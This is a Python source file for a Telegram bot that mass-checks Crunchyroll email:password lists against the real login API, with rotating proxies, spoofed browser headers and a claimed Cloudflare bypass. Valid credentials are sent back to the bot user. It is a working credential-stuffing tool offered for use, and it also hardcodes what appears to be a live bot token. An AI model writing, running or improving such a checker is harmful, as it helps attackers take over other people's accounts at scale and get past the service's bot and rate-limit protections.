#!/usr/bin/env python3
"""
🤖 Crunchyroll Telegram Bot - All-in-One Edition
Combines HTTP automation with Telegram bot functionality
Features: Single check (/cr), Mass check (/mcr), Cloudflare bypass
"""

import asyncio
import aiohttp
import json
import time
import re
import os
import logging
from datetime import datetime
from typing import Dict, List, Optional, Union, Any
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup, Tag
from fake_useragent import UserAgent

# Telegram imports
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Set up logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot Configuration
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "7646562599:AAFewgIfKOfms25zZbbCrdtwejaCmhaTUN0")
BOT_CREATOR = os.getenv("BOT_CREATOR", "@mumiru")
ADMIN_ID = int(os.getenv("ADMIN_ID", "1805944073"))

class ProxyManager:
    """Manages proxy configuration for the bot"""
    
    def __init__(self):
        self.proxies = []
        self.current_proxy_index = 0
        self.proxy_file = "proxies.json"
        self.load_proxies()
    
    def load_proxies(self):
        """Load proxies from file"""
        try:
            if os.path.exists(self.proxy_file):
                with open(self.proxy_file, 'r') as f:
                    self.proxies = json.load(f)
                logger.info(f"Loaded {len(self.proxies)} proxies")
        except Exception as e:
            logger.error(f"Error loading proxies: {e}")
            self.proxies = []
    
    def save_proxies(self):
        """Save proxies to file"""
        try:
            with open(self.proxy_file, 'w') as f:
                json.dump(self.proxies, f, indent=2)
            logger.info(f"Saved {len(self.proxies)} proxies")
        except Exception as e:
            logger.error(f"Error saving proxies: {e}")
    
    def parse_proxy(self, proxy_string: str) -> Optional[Dict[str, str]]:
        """
        Parse proxy from various formats:
        - ip:port
        - http://ip:port
        - http://username:password@ip:port
        - ip:port:username:password
        
        Note: SOCKS5 proxies require aiohttp-socks package which is not installed.
        """
        proxy_string = proxy_string.strip()
        
        if not proxy_string:
            return None
        
        # Reject SOCKS proxies (not supported without aiohttp-socks)
        if proxy_string.lower().startswith('socks'):
            logger.error("SOCKS proxies require aiohttp-socks package which is not installed")
            return None
        
        # Format: http://username:password@ip:port or https://...
        if '://' in proxy_string:
            if proxy_string.lower().startswith(('http://', 'https://')):
                return {'url': proxy_string, 'type': 'url'}
            else:
                logger.error(f"Unsupported proxy scheme in: {proxy_string}")
                return None
        
        # Format: ip:port:username:password
        parts = proxy_string.split(':')
        if len(parts) == 4:
            ip, port, username, password = parts
            return {
                'ip': ip,
                'port': port,
                'username': username,
                'password': password,
                'type': 'auth',
                'url': f'http://{username}:{password}@{ip}:{port}'
            }
        
        # Format: ip:port
        if len(parts) == 2:
            ip, port = parts
            return {
                'ip': ip,
                'port': port,
                'type': 'simple',
                'url': f'http://{ip}:{port}'
            }
        
        return None
    
    def add_proxy(self, proxy_string: str) -> bool:
        """Add a single proxy"""
        parsed = self.parse_proxy(proxy_string)
        if parsed:
            self.proxies.append(parsed)
            self.save_proxies()
            return True
        return False
    
    def add_proxies_bulk(self, proxy_list: List[str]) -> Dict[str, int]:
        """Add multiple proxies"""
        added = 0
        failed = 0
        
        for proxy_string in proxy_list:
            if self.add_proxy(proxy_string):
                added += 1
            else:
                failed += 1
        
        return {'added': added, 'failed': failed}
    
    def get_next_proxy(self) -> Optional[str]:
        """Get next proxy (rotating)"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return proxy.get('url')
    
    def get_all_proxies(self) -> List[Dict[str, str]]:
        """Get all proxies"""
        return self.proxies
    
    def clear_proxies(self):
        """Clear all proxies"""
        self.proxies = []
        self.current_proxy_index = 0
        self.save_proxies()
    
    def remove_proxy(self, index: int) -> bool:
        """Remove proxy by index"""
        try:
            if 0 <= index < len(self.proxies):
                self.proxies.pop(index)
                self.save_proxies()
                return True
        except:
            pass
        return False

proxy_manager = ProxyManager()

class CloudflareHandler:
    """Handles Cloudflare challenge responses and cookie extraction"""
    
    def __init__(self):
        self.ua = UserAgent()
        self.session_cookies = {}
        
    def get_browser_headers(self):
        """Generate realistic browser headers"""
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,ne;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Ch-Ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
    
    def format_cookie_header(self, cookies_dict):
        """Format cookies dictionary into Cookie header string"""
        return '; '.join([f"{name}={value}" for name, value in cookies_dict.items()])

class CrunchyrollChecker:
    """Crunchyroll account checker with Cloudflare bypass"""
    
    def __init__(self, use_proxy=True):
        self.cf_handler = CloudflareHandler()
        self.session_cookies = {}
        self.base_headers = self.cf_handler.get_browser_headers()
        self._session = None
        self.base_url = "https://www.crunchyroll.com"
        self.sso_url = "https://sso.crunchyroll.com"
        self.use_proxy = use_proxy
        # Get proxy once during initialization for this checker instance
        # This ensures rotation happens across different checker instances
        if self.use_proxy:
            self.current_proxy = proxy_manager.get_next_proxy()
            if self.current_proxy:
                logger.info(f"Using proxy: {self.current_proxy}")
        else:
            self.current_proxy = None
        
    async def get_session(self):
        """Get or create persistent session with cookie jar and proxy support"""
        if self._session is None or self._session.closed:
            jar = aiohttp.CookieJar()
            
            # Create session (proxy is set during init, not here)
            if self.current_proxy:
                self._session = aiohttp.ClientSession(
                    cookie_jar=jar,
                    connector=aiohttp.TCPConnector(ssl=False)
                )
            else:
                self._session = aiohttp.ClientSession(cookie_jar=jar)
        return self._session
        
    async def close_session(self):
        """Close the session"""
        if self._session and not self._session.closed:
            await self._session.close()
    
    async def handle_cloudflare_challenge(self, challenge_url, challenge_data=None):
        """Handle Cloudflare challenge platform request"""
        logger.info(f"Handling Cloudflare challenge: {challenge_url}")
        
        headers = {
            **self.base_headers,
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://www.crunchyroll.com',
            'Referer': 'https://www.crunchyroll.com/',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Priority': 'u=1, i'
        }
        
        if self.session_cookies:
            headers['Cookie'] = self.cf_handler.format_cookie_header(self.session_cookies)
        
        session = await self.get_session()
        
        try:
            if challenge_data:
                if self.current_proxy:
                    async with session.post(challenge_url, data=challenge_data, headers=headers, proxy=self.current_proxy) as response:
                        result = await self._process_challenge_response(response)
                        return result
                else:
                    async with session.post(challenge_url, data=challenge_data, headers=headers) as response:
                        result = await self._process_challenge_response(response)
                        return result
            else:
                if self.current_proxy:
                    async with session.get(challenge_url, headers=headers, proxy=self.current_proxy) as response:
                        result = await self._process_challenge_response(response)
                        return result
                else:
                    async with session.get(challenge_url, headers=headers) as response:
                        result = await self._process_challenge_response(response)
                        return result
        except Exception as e:
            logger.error(f"Error handling Cloudflare challenge: {e}")
            return None
    
    async def _process_challenge_response(self, response):
        """Process Cloudflare challenge response and extract cookies"""
        new_cookies = {}
        for name, morsel in response.cookies.items():
            new_cookies[name] = morsel.value
            
        self.session_cookies.update(new_cookies)
        
        if 'cf_clearance' in new_cookies:
            logger.info(f"Got cf_clearance cookie")
        if '__cf_bm' in new_cookies:
            logger.info(f"Got __cf_bm cookie")
            
        response_text = await response.text()
        
        return {
            'status_code': response.status,
            'cookies': new_cookies,
            'response_text': response_text,
            'headers': dict(response.headers)
        }
    
    async def make_authenticated_request(self, url, method='GET', data=None, additional_headers=None):
        """Make an authenticated request with proper cookies and headers"""
        headers = {**self.base_headers}
        
        if additional_headers:
            headers.update(additional_headers)
            
        if self.session_cookies:
            headers['Cookie'] = self.cf_handler.format_cookie_header(self.session_cookies)
        
        session = await self.get_session()
        
        try:
            if method.upper() == 'POST':
                if data and isinstance(data, dict):
                    headers['Content-Type'] = 'application/json'
                    data = json.dumps(data)
                elif data and isinstance(data, str):
                    headers['Content-Type'] = 'text/plain;charset=UTF-8'
                
                if self.current_proxy:
                    async with session.post(url, data=data, headers=headers, proxy=self.current_proxy) as response:
                        return await self._process_response(response)
                else:
                    async with session.post(url, data=data, headers=headers) as response:
                        return await self._process_response(response)
            else:
                if self.current_proxy:
                    async with session.get(url, headers=headers, proxy=self.current_proxy) as response:
                        return await self._process_response(response)
                else:
                    async with session.get(url, headers=headers) as response:
                        return await self._process_response(response)
        except Exception as e:
            logger.error(f"Error making request to {url}: {e}")
            return None
    
    async def _process_response(self, response):
        """Process response and extract data"""
        new_cookies = {}
        for name, morsel in response.cookies.items():
            new_cookies[name] = morsel.value
            
        self.session_cookies.update(new_cookies)
        
        try:
            response_text = await response.text()
            try:
                response_json = json.loads(response_text)
            except:
                response_json = None
        except Exception as e:
            logger.error(f"Error reading response: {e}")
            response_text = ""
            response_json = None
        
        return {
            'status_code': response.status,
            'headers': dict(response.headers),
            'cookies': new_cookies,
            'text': response_text,
            'json': response_json
        }
    
    def _extract_challenge_info(self, html_content):
        """Extract Cloudflare challenge information from HTML"""
        challenge_pattern = r'/cdn-cgi/challenge-platform/[^"\']*'
        matches = re.findall(challenge_pattern, html_content)
        
        if matches:
            challenge_url = urljoin(self.base_url, matches[0])
            return {'url': challenge_url, 'data': None}
        
        return None
    
    async def check_account(self, email: str, password: str) -> Dict[str, Any]:
        """Check a single Crunchyroll account"""
        try:
            logger.info(f"Checking account: {email}")
            
            # Step 1: Initial page visit
            initial_response = await self.make_authenticated_request(self.base_url)
            
            if not initial_response:
                return {
                    'success': False,
                    'status': 'CONNECTION_ERROR',
                    'message': 'Failed to connect to Crunchyroll'
                }
                
            # Step 2: Handle Cloudflare challenges if present
            if initial_response['status_code'] == 403 or 'challenge-platform' in initial_response['text']:
                logger.info("Cloudflare challenge detected")
                challenge_info = self._extract_challenge_info(initial_response['text'])
                
                if challenge_info:
                    challenge_result = await self.handle_cloudflare_challenge(
                        challenge_info['url'], 
                        challenge_info.get('data')
                    )
                    
                    if not challenge_result:
                        return {
                            'success': False,
                            'status': 'CLOUDFLARE_BLOCK',
                            'message': 'Failed to bypass Cloudflare protection'
                        }
            
            # Step 3: Navigate to login page
            login_url = f"{self.sso_url}/login"
            login_page = await self.make_authenticated_request(login_url)
            
            if not login_page:
                return {
                    'success': False,
                    'status': 'LOGIN_PAGE_ERROR',
                    'message': 'Failed to load login page'
                }
                
            # Step 4: Submit login credentials
            login_data = {
                "email": email,
                "password": password,
                "recaptchaToken": "",
                "eventSettings": {}
            }
            
            login_headers = {
                'Origin': self.sso_url,
                'Referer': f"{self.sso_url}/login",
                'Content-Type': 'application/json'
            }
            
            login_response = await self.make_authenticated_request(
                f"{self.sso_url}/api/login",
                method='POST',
                data=login_data,
                additional_headers=login_headers
            )
            
            if login_response:
                status_code = login_response['status_code']
                
                if status_code == 200:
                    return {
                        'success': True,
                        'status': 'VALID',
                        'message': '✅ Account is valid! Login successful',
                        'account_info': login_response.get('json', {})
                    }
                elif status_code == 401:
                    error_data = login_response.get('json', {})
                    error_str = str(error_data).lower()
                    
                    if 'invalid_credentials' in error_str or 'incorrect' in error_str:
                        return {
                            'success': False,
                            'status': 'INVALID_CREDENTIALS',
                            'message': '❌ Wrong email or password'
                        }
                    else:
                        return {
                            'success': False,
                            'status': 'UNAUTHORIZED',
                            'message': '❌ Authentication failed'
                        }
                elif status_code == 429:
                    return {
                        'success': False,
                        'status': 'RATE_LIMITED',
                        'message': '⏱️ Too many requests! Please wait 1-2 minutes and try again'
                    }
                elif status_code == 403:
                    return {
                        'success': False,
                        'status': 'BLOCKED',
                        'message': '🚫 Access blocked (Cloudflare/Security)'
                    }
                else:
                    return {
                        'success': False,
                        'status': 'LOGIN_ERROR',
                        'message': f'⚠️ Error: HTTP {status_code}'
                    }
            
            return {
                'success': False,
                'status': 'UNKNOWN_ERROR',
                'message': 'Unknown error occurred'
            }
            
        except Exception as e:
            logger.error(f"Error checking account {email}: {e}")
            return {
                'success': False,
                'status': 'EXCEPTION',
                'message': str(e)
            }
        finally:
            await self.close_session()

# Telegram Bot Functions
class CrunchyrollBot:
    def __init__(self):
        self.application = Application.builder().token(BOT_TOKEN).build()
        self.setup_handlers()
    
    def setup_handlers(self):
        """Setup bot command handlers"""
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("cr", self.check_single))
        self.application.add_handler(CommandHandler("mcr", self.check_mass))
        self.application.add_handler(CommandHandler("pc", self.proxy_config))
        self.application.add_handler(CommandHandler("listproxy", self.list_proxies))
        self.application.add_handler(CommandHandler("delproxy", self.delete_proxy))
        self.application.add_handler(CommandHandler("clearproxy", self.clear_proxies))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))
        self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
    
    def is_admin(self, user_id: int) -> bool:
        """Check if user is admin"""
        return user_id == ADMIN_ID
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send help message"""
        is_admin = self.is_admin(update.effective_user.id)
        
        help_text = """
🤖 **CrunchyRoll Checker Bot**

**Commands:**
• `/help` - Show this help message
• `/cr email:password` - Check single account
• `/mcr` - Check multiple accounts (send file or list)

**Examples:**
• `/cr example@gmail.com:password123`
• `/mcr` (then send a file with accounts)

**Supported Formats:**
• `email:password`
• `email|password`
• `email password`

**Features:**
✅ Cloudflare bypass
✅ Fast checking
✅ Mass validation
✅ Detailed results
✅ Proxy support
"""
        
        if is_admin:
            help_text += """
**Admin Commands:**
• `/pc <proxy>` - Add proxy configuration
• `/listproxy` - List all configured proxies
• `/delproxy <index>` - Delete proxy by index
• `/clearproxy` - Clear all proxies

**Proxy Formats:**
• `ip:port` - Simple proxy
• `ip:port:username:password` - Authenticated proxy
• `http://ip:port` - HTTP proxy
• `http://username:password@ip:port` - HTTP with auth

**Note:** SOCKS5 proxies are not supported
"""
        
        help_text += f"\n**Bot by** ➜ {BOT_CREATOR}"
        
        await update.message.reply_text(help_text)
    
    async def check_single(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle single account check"""
        if not context.args:
            await update.message.reply_text("❌ **Usage:** `/cr email:password`")
            return
        
        account_data = ' '.join(context.args)
        
        # Parse account data
        parsed = self.parse_account_data(account_data)
        if not parsed:
            await update.message.reply_text("❌ **Invalid format!** Use: `/cr email:password`")
            return
        
        email, password = parsed
        
        # Send checking message
        checking_msg = await update.message.reply_text("🔄 **Checking account...**")
        
        # Check account
        checker = CrunchyrollChecker()
        result = await checker.check_account(email, password)
        
        # Format response
        response = self.format_single_response(email, result)
        
        # Edit message with result
        await checking_msg.edit_text(response, parse_mode='Markdown')
    
    async def check_mass(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle mass account check"""
        await update.message.reply_text(
            "📁 **Send me a file with accounts or paste them here**\n\n"
            "**Supported formats:**\n"
            "• `email:password`\n"
            "• `email|password`\n"
            "• `email password`\n\n"
            "**One account per line**"
        )
    
    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages for mass checking"""
        text = update.message.text.strip()
        
        # Check if it contains account data
        lines = [line.strip() for line in text.split('\n') if line.strip()]
        accounts = []
        
        for line in lines:
            parsed = self.parse_account_data(line)
            if parsed:
                accounts.append(parsed)
        
        if accounts:
            await self.process_mass_check(update, accounts)
        else:
            await update.message.reply_text("❌ **No valid accounts found!**")
    
    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle document uploads for mass checking"""
        document = update.message.document
        
        if document.file_size > 10 * 1024 * 1024:  # 10MB limit
            await update.message.reply_text("❌ **File too large! Max 10MB**")
            return
        
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        
        try:
            text_content = file_content.decode('utf-8')
        except:
            await update.message.reply_text("❌ **Cannot read file! Use text file format.**")
            return
        
        # Parse accounts
        lines = [line.strip() for line in text_content.split('\n') if line.strip()]
        accounts = []
        
        for line in lines:
            parsed = self.parse_account_data(line)
            if parsed:
                accounts.append(parsed)
        
        if accounts:
            await self.process_mass_check(update, accounts)
        else:
            await update.message.reply_text("❌ **No valid accounts found in file!**")
    
    async def process_mass_check(self, update: Update, accounts: List[tuple]):
        """Process mass account checking"""
        total = len(accounts)
        
        if total > 100 and not self.is_admin(update.effective_user.id):
            await update.message.reply_text(f"❌ **Too many accounts! Max 100 for users, found {total}. (Admins have unlimited access)**")
            return
        
        # Send initial message
        progress_msg = await update.message.reply_text(f"🔄 **Checking {total} accounts...**")
        
        valid_accounts = []
        invalid_accounts = []
        errors = []
        
        # Check each account
        for i, (email, password) in enumerate(accounts, 1):
            try:
                checker = CrunchyrollChecker()
                result = await checker.check_account(email, password)
                
                if result['success']:
                    valid_accounts.append((email, password, result))
                else:
                    invalid_accounts.append((email, password, result))
                
                # Update progress every 5 accounts
                if i % 5 == 0:
                    await progress_msg.edit_text(f"🔄 **Progress: {i}/{total}**")
                
                # Add delay to avoid rate limiting (2 seconds between checks)
                if i < total:
                    await asyncio.sleep(2)
                    
            except Exception as e:
                errors.append((email, str(e)))
        
        # Format final response
        response = self.format_mass_response(valid_accounts, invalid_accounts, errors, total)
        
        await progress_msg.edit_text(response, parse_mode='Markdown')
    
    def escape_markdown(self, text: str) -> str:
        """Escape special Markdown characters"""
        special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
        for char in special_chars:
            text = text.replace(char, f'\\{char}')
        return text
    
    def parse_account_data(self, data: str) -> Optional[tuple]:
        """Parse account data from various formats"""
        data = data.strip()
        
        # Try different separators
        for sep in [':', '|', ' ']:
            if sep in data:
                parts = data.split(sep, 1)
                if len(parts) == 2:
                    email, password = parts[0].strip(), parts[1].strip()
                    if '@' in email and email and password:
                        return (email, password)
        
        return None
    
    def format_single_response(self, email: str, result: Dict[str, Any]) -> str:
        """Format single account check response"""
        status_emoji = "✅" if result['success'] else "❌"
        status_text = result['status'].replace('_', ' ')
        email_escaped = self.escape_markdown(email)
        status_escaped = self.escape_markdown(status_text)
        
        response = f"""🔍 *CrunchyRoll Account Check Result*

📧 *Account:* `{email_escaped}`
📊 *Status:* {status_emoji} *{status_escaped}*
💬 *Message:* {self.escape_markdown(result.get('message', 'No message'))}

🤖 *Bot by:* {BOT_CREATOR}"""
        
        return response
    
    def format_mass_response(self, valid: list, invalid: list, errors: list, total: int) -> str:
        """Format mass check response"""
        valid_count = len(valid)
        invalid_count = len(invalid)
        error_count = len(errors)
        
        response = f"""📊 *Mass Check Results*

📈 *Statistics:*
• *Total:* {total}
• *Valid:* ✅ {valid_count}
• *Invalid:* ❌ {invalid_count}
• *Errors:* ⚠️ {error_count}

"""
        
        if valid:
            response += "✅ *Valid Accounts:*\n"
            for email, password, result in valid[:10]:
                email_escaped = self.escape_markdown(email)
                password_escaped = self.escape_markdown(password)
                response += f"• `{email_escaped}:{password_escaped}`\n"
            
            if len(valid) > 10:
                response += f"\\.\\.\\. and {len(valid) - 10} more\n"
            response += "\n"
        
        response += f"🤖 *Bot by:* {BOT_CREATOR}"
        
        return response
    
    async def proxy_config(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin command to configure proxies"""
        if not self.is_admin(update.effective_user.id):
            await update.message.reply_text("❌ **Access Denied!** This command is for admins only.")
            return
        
        if not context.args:
            await update.message.reply_text(
                "📝 **Proxy Configuration**\n\n"
                "**Usage:** `/pc <proxy>`\n\n"
                "**Supported Formats:**\n"
                "• `ip:port` - Simple proxy\n"
                "• `ip:port:username:password` - Authenticated proxy\n"
                "• `http://ip:port` - HTTP proxy\n"
                "• `http://username:password@ip:port` - HTTP with auth\n\n"
                "**Note:** SOCKS5 proxies are not supported\n\n"
                "**Examples:**\n"
                "• `/pc 192.168.1.1:8080`\n"
                "• `/pc 192.168.1.1:8080:user:pass`\n"
                "• `/pc http://proxy.example.com:3128`\n\n"
                "**Add Multiple:**\n"
                "Send multiple proxies, one per line (without /pc)"
            )
            return
        
        # Check if single proxy or multiple
        proxy_data = ' '.join(context.args)
        
        # Try to add single proxy
        if proxy_manager.add_proxy(proxy_data):
            total_proxies = len(proxy_manager.get_all_proxies())
            await update.message.reply_text(
                f"✅ **Proxy Added Successfully!**\n\n"
                f"📊 Total Proxies: {total_proxies}\n\n"
                f"Use `/listproxy` to see all proxies"
            )
        else:
            await update.message.reply_text(
                "❌ **Invalid Proxy Format!**\n\n"
                "Please use one of the supported formats.\n"
                "Use `/pc` without arguments to see examples."
            )
    
    async def list_proxies(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin command to list all proxies"""
        if not self.is_admin(update.effective_user.id):
            await update.message.reply_text("❌ **Access Denied!** This command is for admins only.")
            return
        
        proxies = proxy_manager.get_all_proxies()
        
        if not proxies:
            await update.message.reply_text(
                "📋 **No Proxies Configured**\n\n"
                "Use `/pc <proxy>` to add a proxy."
            )
            return
        
        response = f"📋 **Configured Proxies** ({len(proxies)})\n\n"
        
        for i, proxy in enumerate(proxies):
            proxy_type = proxy.get('type', 'unknown')
            if proxy_type == 'simple':
                proxy_str = f"{proxy['ip']}:{proxy['port']}"
            elif proxy_type == 'auth':
                proxy_str = f"{proxy['ip']}:{proxy['port']} (auth: {proxy['username']})"
            else:
                proxy_str = proxy.get('url', 'Unknown')
            
            response += f"{i}. `{self.escape_markdown(proxy_str)}`\n"
        
        response += f"\n💡 Use `/delproxy <index>` to remove a proxy"
        
        await update.message.reply_text(response, parse_mode='Markdown')
    
    async def delete_proxy(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin command to delete a proxy"""
        if not self.is_admin(update.effective_user.id):
            await update.message.reply_text("❌ **Access Denied!** This command is for admins only.")
            return
        
        if not context.args:
            await update.message.reply_text(
                "❌ **Usage:** `/delproxy <index>`\n\n"
                "Use `/listproxy` to see proxy indices."
            )
            return
        
        try:
            index = int(context.args[0])
            if proxy_manager.remove_proxy(index):
                total_proxies = len(proxy_manager.get_all_proxies())
                await update.message.reply_text(
                    f"✅ **Proxy Removed!**\n\n"
                    f"📊 Remaining Proxies: {total_proxies}"
                )
            else:
                await update.message.reply_text(
                    "❌ **Invalid Index!**\n\n"
                    "Use `/listproxy` to see valid indices."
                )
        except ValueError:
            await update.message.reply_text("❌ **Invalid Index!** Please provide a number.")
    
    async def clear_proxies(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin command to clear all proxies"""
        if not self.is_admin(update.effective_user.id):
            await update.message.reply_text("❌ **Access Denied!** This command is for admins only.")
            return
        
        proxy_manager.clear_proxies()
        await update.message.reply_text(
            "✅ **All Proxies Cleared!**\n\n"
            "The bot will now make direct connections."
        )
    
    def run(self):
        """Start the bot"""
        logger.info("Starting Crunchyroll Checker Bot...")
        self.application.run_polling()

def main():
    """Main function"""
    bot = CrunchyrollBot()
    
    print("🤖 Crunchyroll Telegram Bot Started!")
    print("📱 Bot is running and ready to check accounts")
    print(f"🔗 Bot Token: {BOT_TOKEN[:10]}...")
    
    try:
        bot.application.run_polling()
    except KeyboardInterrupt:
        print("\n👋 Bot stopped!")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()